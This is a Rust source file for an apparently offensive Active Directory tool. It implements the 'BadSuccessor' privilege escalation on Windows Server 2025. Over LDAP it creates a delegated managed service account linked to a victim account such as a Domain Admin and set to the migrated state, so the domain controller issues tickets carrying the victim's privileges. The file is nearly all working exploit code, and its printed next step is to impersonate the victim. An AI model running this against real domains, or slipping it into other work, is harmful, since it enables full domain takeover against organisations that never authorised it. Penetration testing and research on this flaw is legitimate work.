//! BadSuccessor (Server 2025 dMSA escalation) — create a delegated MSA that
//! points at a victim via `msDS-ManagedAccountPrecededByLink` with state=2
//! (Migrated). The 2025 KDC then issues TGTs to the dMSA carrying the victim's
//! PAC — full impersonation, no ACE on the victim, no password reset.

use anyhow::Result;
use clap::Parser;

#[derive(Parser)]
pub(crate) struct BadsuccessorArgs {
    /// LDAP URL (LDAPS strongly preferred — the dMSA link is a privileged write)
    #[arg(long)]
    pub url: String,
    #[arg(long)]
    pub user: String,
    #[arg(long)]
    pub password: String,
    #[arg(long)]
    pub insecure: bool,
    /// OU/container the attacker can create objects in (e.g. `OU=Servers,DC=corp,DC=local`).
    /// Defaults to `CN=Managed Service Accounts` under the domain root.
    #[arg(long)]
    pub container: Option<String>,
    /// Name to give the new dMSA (a `$`-suffixed sAMAccountName is appended).
    #[arg(long)]
    pub dmsa_name: String,
    /// sAMAccountName of the account to succeed (typically a Domain Admin).
    #[arg(long)]
    pub target: String,
}

/// `attack badsuccessor` — Akamai/Yuval Gordon 2025 dMSA escalation. Any principal that can
/// create a child object in *any* container can create a delegated MSA whose
/// `msDS-ManagedAccountPrecededByLink` points at a Domain Admin, and set
/// `msDS-DelegatedMSAState=2` (Migrated). The Server 2025 KDC then issues TGTs to the dMSA
/// carrying the *victim's* PAC — full impersonation, no ACE on the victim, no password reset.
///
/// LIVE VALIDATION OWED: the attack landed on Server 2025 GA; behaviour on later Cumulative
/// Updates may change. Run against the 2025 DC on your matrix and confirm the dMSA is
/// accepted (LDAP add succeeds) and issues a working TGT.
pub(crate) async fn badsuccessor(a: BadsuccessorArgs) -> Result<()> {
    use adhammer_collector::{Collector, LdapConfig};
    let cfg = LdapConfig {
        url: a.url.clone(),
        bind_dn: a.user.clone(),
        password: a.password.clone(),
        base_dn: None,
        insecure: a.insecure,
        gssapi: false,
    };
    let mut c = Collector::connect(&cfg).await?;
    // ux-2: accept SID / sAMAccountName / DN via unified classifier.
    let victim_dn = crate::target::to_dn(&mut c, &a.target).await?;
    let base = c.base_dn().to_string();
    let container = a
        .container
        .clone()
        .unwrap_or_else(|| format!("CN=Managed Service Accounts,{base}"));

    let name = a.dmsa_name.trim_end_matches('$');
    let sam = format!("{name}$");
    let dn = format!("CN={name},{container}");
    // Derive DNS domain from base DN: "DC=testlab,DC=local" -> "testlab.local".
    let dns_domain: String = base
        .split(',')
        .filter_map(|p| {
            p.trim()
                .strip_prefix("DC=")
                .or_else(|| p.trim().strip_prefix("dc="))
        })
        .collect::<Vec<_>>()
        .join(".");
    let dns_host = format!("{name}.{dns_domain}");

    // dMSA is a subclass of msDS-GroupManagedServiceAccount (structural, inherits from computer).
    // Adding `computer`/`user`/`person` explicitly conflicts with the schema on Server 2025 —
    // let the structural chain resolve them.
    let attrs: Vec<(&str, Vec<Vec<u8>>)> = vec![
        (
            "objectClass",
            vec![
                b"top".to_vec(),
                b"msDS-DelegatedManagedServiceAccount".to_vec(),
            ],
        ),
        ("sAMAccountName", vec![sam.as_bytes().to_vec()]),
        ("dNSHostName", vec![dns_host.as_bytes().to_vec()]),
        // UAC = WORKSTATION_TRUST_ACCOUNT (0x1000).
        ("userAccountControl", vec![b"4096".to_vec()]),
        // AES256 | AES128 | RC4 = 28 (minimum modern default).
        ("msDS-SupportedEncryptionTypes", vec![b"28".to_vec()]),
        // Required by gMSA schema — 30 days is the default rotation.
        ("msDS-ManagedPasswordInterval", vec![b"30".to_vec()]),
        // 2 = kMSA_MIGRATED — the "successor" state the KDC recognises.
        ("msDS-DelegatedMSAState", vec![b"2".to_vec()]),
        // The victim link — the KDC issues the dMSA a TGT with THIS account's PAC.
        (
            "msDS-ManagedAccountPrecededByLink",
            vec![victim_dn.as_bytes().to_vec()],
        ),
    ];
    c.add_object(&dn, attrs).await?;
    println!("[+] created dMSA {dn}");
    println!(
        "    → succeeds {} (PAC of the victim is issued to {sam})",
        a.target
    );
    println!(
        "    Next: request a TGT as {sam} and use it as if it were {}",
        a.target
    );
    Ok(())
}
